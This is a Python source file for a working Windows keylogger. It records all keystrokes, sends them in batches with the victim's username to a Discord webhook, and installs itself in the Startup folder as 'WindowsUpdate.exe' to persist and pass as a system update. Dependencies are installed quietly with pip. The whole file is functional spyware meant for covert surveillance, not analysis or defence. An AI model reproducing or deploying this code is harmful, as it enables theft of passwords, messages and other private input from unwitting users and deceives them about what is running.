import os
import sys
import json
import requests
from pynput import keyboard
from pynput.keyboard import Key, Listener
import threading
import getpass
import shutil

class StealthKeylogger:
    def __init__(self, webhook_url, disable_method="always_running"):
        self.webhook_url = webhook_url
        self.disable_method = disable_method
        self.log = ""
        self.count = 0
        self.buffer_size = 100  # Send every 100 keystrokes
        self.username = getpass.getuser()
        
        # Setup persistence
        self.setup_persistence()
        
        # Start keylogger
        self.start_keylogger()

    def setup_persistence(self):
        """Copy self to startup folder"""
        try:
            appdata = os.getenv('APPDATA')
            startup_path = os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            
            if not os.path.exists(startup_path):
                os.makedirs(startup_path)
                
            exe_path = os.path.join(startup_path, "WindowsUpdate.exe")
            
            if not os.path.exists(exe_path):
                if getattr(sys, 'frozen', False):
                    # Running as exe
                    shutil.copy2(sys.executable, exe_path)
                else:
                    # Running as script
                    if os.path.exists("keylogger.exe"):
                        shutil.copy2("keylogger.exe", exe_path)
        except Exception as e:
            pass

    def on_press(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            if key == Key.space:
                self.log += " "
            elif key == Key.enter:
                self.log += "\n"
            else:
                self.log += f" [{key}] "
        
        self.count += 1
        if self.count >= self.buffer_size:
            self.send_log()
            self.count = 0
            self.log = ""

    def send_log(self):
        """Send logs to Discord webhook"""
        if not self.log.strip():
            return
            
        data = {
            "embeds": [{
                "title": "⌨️ Keystroke Report",
                "description": f"```{self.log}```",
                "color": 10181046,  # Purple
                "author": {
                    "name": f"User: {self.username}",
                    "icon_url": "https://cdn-icons-png.flaticon.com/512/3069/3069172.png"
                },
                "footer": {
                    "text": f"Batch of {self.buffer_size} keystrokes",
                    "icon_url": "https://cdn-icons-png.flaticon.com/512/709/709612.png"
                }
            }]
        }
        
        try:
            response = requests.post(self.webhook_url, json=data, timeout=10)
            if response.status_code != 200:
                with open("keylogger_error.log", "a") as f:
                    f.write(f"Webhook failed: {response.status_code} - {response.text}\n")
        except Exception as e:
            with open("keylogger_error.log", "a") as f:
                f.write(f"Webhook error: {str(e)}\n")

    def start_keylogger(self):
        """Start keylogger in background thread"""
        def run():
            if self.disable_method == "hotkey":
                # Hotkey to stop keylogger
                def on_activate():
                    os._exit(0)
                    
                h = keyboard.GlobalHotKeys({
                    '<ctrl>+<alt>+k': on_activate
                })
                h.start()
                
            with Listener(on_press=self.on_press) as listener:
                listener.join()
                
        thread = threading.Thread(target=run, daemon=True)
        thread.start()

def ensure_dependencies():
    """Ensure all dependencies are installed before running"""
    import subprocess
    import sys
    import os
    import time
    import tempfile
    
    # Check if we're running as exe
    is_exe = getattr(sys, 'frozen', False)
    
    # Get paths
    if is_exe:
        base_path = sys._MEIPASS
        req_file = os.path.join(base_path, "requirements.txt")
    else:
        req_file = "requirements.txt"
    
    # Try importing first
    try:
        import requests
        import pynput
        return True
    except ImportError:
        pass
    
    # Prepare pip command
    pip_cmd = [
        sys.executable,
        "-m",
        "pip",
        "install",
        "--quiet",
        "--disable-pip-version-check"
    ]
    
    # Try installing from requirements.txt
    if os.path.exists(req_file):
        for attempt in range(3):
            try:
                subprocess.check_call(pip_cmd + ["-r", req_file])
                return True
            except:
                time.sleep(2)
    
    # Fallback to direct install
    try:
        subprocess.check_call(pip_cmd + ["requests"])
        subprocess.check_call(pip_cmd + ["pynput"])
        return True
    except:
        pass
    
    # Final fallback - create temp bat file for admin install
    if is_exe:
        try:
            with tempfile.NamedTemporaryFile(suffix='.bat', delete=False) as f:
                f.write(f"""
@echo off
echo Installing required Python packages...
"{sys.executable}" -m pip install requests pynput --quiet
pause
""".encode())
            os.startfile(f.name)
        except:
            pass
    
    return False

if __name__ == "__main__":
    try:
        # Ensure dependencies are installed before proceeding
        if not ensure_dependencies():
            raise ImportError("Failed to install required dependencies")
        
        # Read config from built-in variables
        if 'webhook_url' not in globals():
            webhook_url = None
        if 'disable_method' not in globals():
            disable_method = "always_running"
            
        if not webhook_url:
            raise ValueError("No webhook URL provided")
            
        if not webhook_url.startswith("https://discord.com/api/webhooks/"):
            raise ValueError("Invalid Discord webhook format")
            
        # Test webhook connection with fancy message
        init_msg = {
            "content": "🔵 **Keylogger Status**",
            "embeds": [{
                "title": "Initialization Successful",
                "description": f"Keylogger active for user: `{getpass.getuser()}`",
                "color": 5763719,  # Green color
                "fields": [
                    {"name": "Webhook", "value": "✅ Working", "inline": True},
                    {"name": "Mode", "value": f"`{disable_method}`", "inline": True}
                ]
            }]
        }
        test_response = requests.post(webhook_url, json=init_msg, timeout=10)
        if test_response.status_code not in [200, 204]:
            raise ValueError(f"Webhook test failed: {test_response.status_code}")
            
        keylogger = StealthKeylogger(webhook_url, disable_method)
        # Keep main thread alive
        import time
        while True:
            time.sleep(1)  # Prevent high CPU usage
            
    except Exception as e:
        with open("keylogger_startup.log", "a") as f:
            f.write(f"Startup error: {str(e)}\n")
        
        # Create simple error window before exiting
        try:
            import tkinter as tk
            root = tk.Tk()
            root.withdraw()
            tk.messagebox.showerror(
                "Keylogger Error",
                f"Failed to start:\n{str(e)}\n\nSee keylogger_startup.log for details"
            )
        except:
            pass
        sys.exit(1)
